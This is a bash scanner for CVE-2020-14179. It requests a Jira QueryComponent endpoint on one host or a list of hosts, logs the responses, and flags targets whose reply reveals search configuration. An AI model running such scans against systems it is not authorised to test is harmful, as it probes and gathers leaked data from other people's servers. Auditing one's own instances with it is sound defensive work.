#!/bin/bash

output_folder="results"
banner="
███████╗██╗███╗░░░███╗███╗░░░██╗  ░██████╗░██╗░░░░░███████╗██╗░░░░░░█████╗░
██╔════╝██║████╗░████║████╗░░██║  ██╔════╝░██║░░░░░██╔════╝██║░░░░░██╔══██╗
█████╗░░██║██╔████╔██║██╔██╗░██║  ██║░░██╗░██║░░░░░█████╗░░██║░░░░░██║░░██║
██╔══╝░░██║██║╚██╔╝██║██║╚██╗██║  ██║░░╚██╗██║░░░░░██╔══╝░░██║░░░░░██║░░██║
██║░░░░░██║██║░╚═╝░██║██║░╚████║  ╚██████╔╝╚██████╗███████╗███████╗╚█████╔╝
╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═══╝  ░╚═════╝░░╚═════╝╚══════╝╚══════╝░╚════╝░
"

mkdir -p "$output_folder"

process_target() {
    host="$1"
    result_file="$output_folder/$(echo "$host" | tr -d '/' | tr -d ':').txt"
    log_file="$output_folder/$(echo "$host" | tr -d '/' | tr -d ':')_log.txt"

    echo -e "\033[1;36m$banner"
    echo -e "\033[1;33m[+] CVE-2020-14179 Finder \033[0m"
    echo -e "\033[1;32m[+] Code by Samuel - Nazu \033[0m"
    echo -e "\033[1;31m[-] Target: $host \033[0m"
    echo -e "\033[1;33m[*] Sending request to $host/secure/QueryComponent!Default.jspa...\033[0m"
    
    curl_output=$(curl -v -k --insecure --path-as-is "$host/secure/QueryComponent\!Default.jspa" 2>&1 | tee "$log_file")

    if echo "$curl_output" | grep -qsi 'searchers'; then
        echo -e "\033[1;31m[!] Vulnerable \033[0m" > "$result_file"
        echo -e "\033[1;31m[*] Response indicates vulnerability. Stored in $result_file.\033[0m"
    else
        echo -e "\033[1;32m[+] Not Vulnerable \033[0m" > "$result_file"
        echo -e "\033[1;32m[*] Response does not indicate vulnerability. Stored in $result_file.\033[0m"
    fi
}

if [ "$#" -eq 0 ]; then
    echo "Usage: $0 [-l <target_file> | -u <target_url>]"
    exit 1
fi

while [[ $# -gt 0 ]]; do
    case "$1" in
        -l|--list)
            if [ $# -lt 2 ]; then
                echo "Error: Missing argument for option -l|--list"
                exit 1
            fi
            target_file="$2"
            shift 2
            while read -r host; do
                process_target "$host"
            done < "$target_file"
            ;;
        -u|--url)
            if [ $# -lt 2 ]; then
                echo "Error: Missing argument for option -u|--url"
                exit 1
            fi
            target_url="$2"
            shift 2
            process_target "$target_url"
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

